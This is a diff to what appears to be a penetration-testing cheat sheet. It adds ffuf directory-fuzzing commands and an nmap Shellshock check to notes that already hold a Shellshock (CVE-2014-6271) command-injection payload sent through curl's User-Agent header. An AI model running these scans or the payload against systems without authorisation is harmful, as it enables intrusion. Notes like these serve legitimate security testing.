@@ -65,7 +65,9 @@ davtest -url 'URL' -cleanup
 - ffuf
 ```sh
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ/
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 'URL'/FUZZ
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://'URL'/FUZZ -e .sh
 ```
 - nmap
 ```sh
@@ -75,6 +77,7 @@ nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
 - exploit
   - shellshock
     ```sh
+    nmap -n -Pn -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh 'IP'
     # CVE-2014-6271
     curl -A "() { :;}; COMMAND" 'URL'
     ```
